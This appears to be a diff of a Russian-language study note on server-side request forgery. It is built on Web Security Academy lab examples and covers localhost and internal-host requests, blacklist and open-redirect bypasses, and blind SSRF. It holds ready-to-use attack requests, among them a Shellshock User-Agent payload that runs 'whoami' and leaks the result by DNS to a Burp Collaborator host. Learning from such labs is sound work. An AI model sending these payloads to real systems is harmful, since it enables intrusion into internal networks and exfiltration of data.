@@ -2,31 +2,38 @@
 
 [SSRF Cheat Sheet & Bypass Techniques](https://highon.coffee/blog/ssrf-cheat-sheet)
 
-## Распространенные атаки SSRF
+# Распространенные атаки SSRF
 ### SSRF против самого сервера
 При атаке SSRF на сам сервер злоумышленник заставляет приложение сделать HTTP-запрос обратно на сервер, на котором размещено приложение, через его loopback сетевой интерфейс. Обычно это включает в себя предоставление URL с именем хоста, например `127.0.0.1` или `localhost`.
 
 Запрос к API для проверки наличия товара на складе:
 
-	POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded
-	Content-Length: 118
-	stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+```
+POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+```
 
 В этой ситуации злоумышленник может изменить запрос, чтобы указать URL, локальный для самого сервера:
 
-	POST /product/stock HTTP/1.0 
-	Content-Type: application/x-www-form-urlencoded 
-	Content-Length: 118 
-	stockApi=http://localhost/admin
+```
+POST /product/stock HTTP/1.0 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 118 
+stockApi=http://localhost/admin
+```
 
 ### SSRF на другие внутренние системы
 
-	POST /product/stock HTTP/1.0
-	Content-Type: application/x-www-form-urlencoded
-	Content-Length: 118
-	stockApi=http://192.168.0.68/admin
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+stockApi=http://192.168.0.68/admin
+```
 
-## Обход распространенных способов защиты от SSRF
+# Обход распространенных способов защиты от SSRF
 ### SSRF с входными фильтрами на основе черных списков
 Обход фильтра:
 - альтернативные IP-представления `127.0.0.1`, например `2130706433`, `017700000001` или `127.1`
@@ -53,50 +60,64 @@
 ### Обход фильтров SSRF через открытое перенаправление
 Есть функционал перехода на следующую страницу, которая содержит уязвимость `open redirection`, при которой URL:
 
-	GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080
+```
+GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080
+```
 
 возвращает перенаправление на:
 
-	`http://192.168.0.12:8080`
+```
+http://192.168.0.12:8080
+```
 
 Используем уязвимость для обхода фильтра URL и выполняем SSRF:
 
-	POST /product/stock HTTP/1.1
-	Host: ac951fab1ffef84ac0f0709400cb00a1.web-security-academy.net
-	Content-Type: application/x-www-form-urlencoded
-	Content-Length: 88
-	
-	stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+```
+POST /product/stock HTTP/1.1
+Host: ac951fab1ffef84ac0f0709400cb00a1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+```
 
 Этот SSRF-эксплойт работает потому что приложение сначала проверяет, что предоставленный URL `stockAPI` находится в разрешенном домене, что и происходит. Затем приложение запрашивает предоставленный URL, что вызывает открытое перенаправление. Оно следует перенаправлению и делает запрос на внутренний URL по выбору злоумышленника.
 
-## Слепые SSRF ^91df93
+# Слепые SSRF ^91df93
 
 Например, на сайте используется аналитическое программное обеспечение, которое получает URL, указанный в заголовке `Referer`, когда загружается страница продукта:
 
-	GET /product?productId=19 HTTP/1.1
-	Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
-	Referer: https://ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net/
+```
+GET /product?productId=19 HTTP/1.1
+Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
+Referer: https://ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net/
+```
 
 Вызов запроса к серверу Burp Collaborator:
 
-	GET /product?productId=19 HTTP/1.1
-	Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
-	Referer: http://2wznfi7jzcg9hkmhurnhykpjfal69v.burpcollaborator.net
+```
+GET /product?productId=19 HTTP/1.1
+Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
+Referer: http://2wznfi7jzcg9hkmhurnhykpjfal69v.burpcollaborator.net
+```
 
 **Blind SSRF + shellshock**
 Shellshock payload: 
 
-	() { :;}; echo "pwned"
+```
+() { :;}; echo "pwned"
+```
 
 Пример запроса:
 
-	GET /product?productId=1 HTTP/1.1
-	Host: ac901f3e1ea49cd3c054f7d2005b00d1.web-security-academy.net
-	User-Agent: () { :;}; /usr/bin/nslookup $(whoami).6fmtccqu58psg7aj77qad8m9j0psdh.burpcollaborator.net
-	Referer: http://192.168.0.§1§:8080
+```
+GET /product?productId=1 HTTP/1.1
+Host: ac901f3e1ea49cd3c054f7d2005b00d1.web-security-academy.net
+User-Agent: () { :;}; /usr/bin/nslookup $(whoami).6fmtccqu58psg7aj77qad8m9j0psdh.burpcollaborator.net
+Referer: http://192.168.0.§1§:8080
+```
 
-## Поиск скрытой поверхности атаки для уязвимостей SSRF
+# Поиск скрытой поверхности атаки для уязвимостей SSRF
 ### Частичные URL-адреса в запросах
 Иногда приложение помещает в параметры запроса `только имя хоста или часть пути URL`. Затем переданное значение включается на стороне сервера в полный URL, который запрашивается. Если значение легко распознается как имя хоста или путь URL, то потенциальная поверхность атаки может быть очевидной. Однако возможности использования SSRF могут быть ограничены, поскольку вы не контролируете весь URL, который запрашивается.
 
